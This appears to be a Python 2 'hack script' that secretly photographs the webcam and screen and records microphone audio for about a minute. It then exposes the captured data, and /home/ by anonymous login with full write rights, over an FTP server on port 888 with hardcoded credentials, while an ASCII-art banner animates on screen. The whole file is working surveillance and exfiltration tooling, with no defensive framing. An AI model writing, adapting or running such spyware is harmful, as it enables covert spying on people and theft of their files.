#!/usr/bin/python
#by Saurabh Londhe
"""
dependancy:
	pip install opencv-python
	pip install numpy
	pip install simplecv
	pip install scipy
	apt-get install python-xlib
	sudo apt-get install python-dev libpq-dev
	pip install pyftpdlib
	pip install pyscreenshot
		
		output:
				1)	WEB-CAM-&-SCREEN recorder will record th' CAMERA & the screen will be recorded for 1 minute
			2)	the AUDIO will record the audio for 1 minute
			3)	the FTP will give an acces to the all data recorded with machine's ip and port '888'
					user='toretto' pass='toor'
		
		sequence of execution:
				1)	at a time 'WEB-CAM-&-SCREEN' 	&	 'AUDIO' should be executed so that the data will be recorded for the same minute
				2)	after these FTP should be executed so that 'toretto' can get data using ftp service

"""
#-------------------------------------------------------------------
import pygame,os,datetime,time,thread,pyaudio,wave
from pygame import camera
import pyscreenshot as ImageGrab
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
#--------------------global-declaration-----------------------------
cwd = os.getcwd()
#t=""
#t1=""
#---------------------WEB-CAM-&-SCREEN------------------------------
def loop():
	pygame.camera.init()
	#pygame.camera.list_camera() #Camera detected or not
	cam = pygame.camera.Camera("/dev/video0",(640,480))
	cam.start()
	i=0
	os.system("rm -rf web_2_data && mkdir -p web_2_data/web_jpg")
	os.system("mkdir -p web_2_data/web_png")
	t_now=datetime.datetime.now()
	t=str(t_now)[14:16]
	t1="0"
	while (int(t)+1)!=int(t1):
		name="pic_"+str(i)+".jpg"
		name_png="pic_"+str(i)+".png"
		img = cam.get_image()
		ImageGrab.grab_to_file(name_png)
		pygame.image.save(img,name)	
		copy="mv "+name+" web_2_data/web_jpg"
		os.system(copy)
		copy="mv "+name_png+" web_2_data/web_png/"
		os.system(copy)
		t_now1=str(datetime.datetime.now())
		t1=t_now1[14:16]
		i+=1
		time.sleep(0.2)

#-----------------------------FTP---------------------------------
def ftp():
	authorizer = DummyAuthorizer()
	authorizer.add_user("toretto", "toor", cwd, perm="elradfmw")
	authorizer.add_anonymous("/home/", perm="elradfmw")

	handler = FTPHandler
	handler.authorizer = authorizer
	os.system("ifconfig > data.txt")
	f=open("data.txt")
	for i in f:
		if "inet " in i:
			s=i
	ip=s[13:27]
	server = FTPServer((ip,888), handler)
	server.serve_forever()
#---------------------------AUDIO------------------------------------

def audio():
	FORMAT = pyaudio.paInt16
	CHANNELS = 2
	RATE = 44100
	CHUNK = 1024
	RECORD_SECONDS = 5
	WAVE_OUTPUT_FILENAME =str(time.ctime())
	 
	audio = pyaudio.PyAudio()
	 
	# start Recording
	stream = audio.open(format=FORMAT, channels=CHANNELS,
					rate=RATE, input=True,
					frames_per_buffer=CHUNK)
	print "recording..."
	frames = []
	t_now=datetime.datetime.now()
	t=str(t_now)[14:16]
	t1="0"
	while (int(t)+1)!=int(t1):
		data = stream.read(CHUNK)
		frames.append(data)
		t_now1=str(datetime.datetime.now())
		t1=t_now1[14:16]
	print "finished recording"
	 
	 
	# stop Recording
	stream.stop_stream()
	stream.close()
	audio.terminate()
	 
	waveFile = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
	waveFile.setnchannels(CHANNELS)
	waveFile.setsampwidth(audio.get_sample_size(FORMAT))
	waveFile.setframerate(RATE)
	waveFile.writeframes(b''.join(frames))
	waveFile.close()
	copy="mv '"+WAVE_OUTPUT_FILENAME+"' web_2_data/"
	os.system(copy)
#--------------------------------------------------------------------
def loading():
	a="""
  ,                                                       
 @      .                                               
  @*     @                                              
   @@     @#                                            
    @@&   ,@@                                           
     @@@,  ,@@@                                         
      @@@@   @@@&                                       
@@     @@@@@  @@@@*                                     
@@@@@@. /@@@@@ @@@@@                                    
@@@@@@@@@@@@@@@@ @@@@@                                  
@@@@@@@@@@@@@@@@@@@@@@@@                                
@@@@@@@@@@@@@@@@@@@@@@@@@@/                             
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                           
     #@@@@@@@@@@@@@@@@@@@@@@@@@                         
         %@@@@@@@@@@@@@@@@@@@@@@%                       
            &&@@@@@@@@@@@@@@@@@@@@                      
               @@@@@@@@@@@@@% @@@@@                     
                 @@@@@@@@@@@@@ %@@@@,                   
                  &@@@@@@@@@@@@@ @@@@%                  
                    @@@@@@@@@@@@@@@@@@@                 
                     %@@@@@@@@@@@@@@@@@@@               
                       .@@@@@@@@@@@@@@@                 
                          (@@@@@@@@@@@@@                
                             (@@@@@@@@@@@@              
                                &@@@@@@@@@@@            
                                  #@@@@@@@@@@@%         
                                    @@@@@@@@@@@@        
                                     &@@@@@@@@@%        
                                      @@@@@@@@,         
                                      (@@@@@&           
                                      @@@&              
"""
	data=""
	#import time,os
	for i in a:
		data=data+i
		print data
		os.system("clear")
	i=0
	s="hack script by saurabh londhe"
	while True:
		if i==len(s):
			i=0
		print data
		print s[0:i]+s[i].upper()+s[i+1:]
		i+=1
		time.sleep(0.05)
		os.system("clear")

#---------------------------------------------------------------------
thread.start_new_thread(audio,())
thread.start_new_thread(loading,())
thread.start_new_thread(ftp,())
loop()
#thread.start_new_thread(loop,())
#loop()
#ftp()
#audio()
#folder_name=time.ctime()
#name_folder="zip -rf '"+str(folder_name)[0:]+".zip' web_2_data/"
#os.system(name_folder)
#--------------------------------------------------------------------
